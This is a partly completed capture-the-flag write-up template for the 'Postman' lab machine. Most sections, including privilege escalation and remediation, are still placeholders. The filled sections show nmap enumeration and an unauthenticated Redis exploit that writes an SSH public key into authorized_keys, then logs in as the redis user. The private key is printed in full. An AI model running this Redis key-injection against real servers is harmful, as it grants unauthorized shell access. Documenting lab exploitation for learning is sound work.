
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sC -sV postman.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 17:00 EDT
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.77% done; ETC: 17:00 (0:00:00 remaining)
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.032s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.56 seconds

```

```
 nmap -p- postman.htb --open           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 17:00 EDT
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.036s latency).
Not shown: 65468 closed tcp ports (reset), 63 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds

```

```
nmap -sC -sV postman.htb --open -p 6379
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 17:37 EDT
Nmap scan report for postman.htb (10.129.138.65)
Host is up (0.035s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds

```

### Redis Enumeration

```
redis-cli -h 10.129.140.170
10.129.140.170:6379> config get dir
1) "dir"
2) "/var/lib/redis"
10.129.140.170:6379> config set dir ./.ssh
OK
10.129.140.170:6379> config get dir
3) "dir"
4) "/var/lib/redis/.ssh"

```

### Redis Exploitation

```
ssh-keygen -t ed25519 -f redis_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in redis_key
Your public key has been saved in redis_key.pub
The key fingerprint is:
SHA256:OWerVFPcQXj/oAl1QxcPglrYH4jUIOeWDNv0QBQfGq4 kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|      o+@B.o.+=.o|
|       @oB*o+o++.|
|      . Ooooo+.o.|
|       o..... . .|
|      E S =. o ..|
|         = oo   .|
|        . .      |
|       . .       |
|        .        |
+----[SHA256]-----+

```

```
┌──(kali㉿kali)-[~/machines/postman]
└─$ cat redis_key; echo -e "\n\n"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD8wcvhMa8rLPUkgI1sCavJX4WlWAxved0VzrqAbrDPfQAAAJCiP5Unoj+V
JwAAAAtzc2gtZWQyNTUxOQAAACD8wcvhMa8rLPUkgI1sCavJX4WlWAxved0VzrqAbrDPfQ
AAAEDhaeZXSPE+YamMDx2Ex0CvsHA7nCBllMa64VQqQ1FhgPzBy+Exryss9SSAjWwJq8lf
haVYDG953RXOuoBusM99AAAACWthbGlAa2FsaQECAwQ=
-----END OPENSSH PRIVATE KEY-----



                                                                                                                    
┌──(kali㉿kali)-[~/machines/postman]
└─$ (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > spaced_key.txt
                                                                                                                    
┌──(kali㉿kali)-[~/machines/postman]
└─$ cat spaced_key.txt | redis-cli -h 10.129.140.170 -x set ssh_key
OK

```

```
 redis-cli -h 10.129.140.170
10.129.140.170:6379> config set dir /var/lib/redis/.ssh
OK
10.129.140.170:6379> config set dbfilename "authorized_keys"
OK
10.129.140.170:6379> save
OK
10.129.140.170:6379> 

```

## Access as redis

```
ssh -i redis_key redis@10.129.140.170
The authenticity of host '10.129.140.170 (10.129.140.170)' can't be established.
ED25519 key fingerprint is: SHA256:eBdalosj8xYLuCyv0MFDgHIabjJ9l3TMv1GYjZdxY9Y
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:57: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.140.170' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
redis@Postman:~$ 

```

---
## Lateral movement

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

Step-by-step exploitation with commands.

```shell
# Commands used
```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)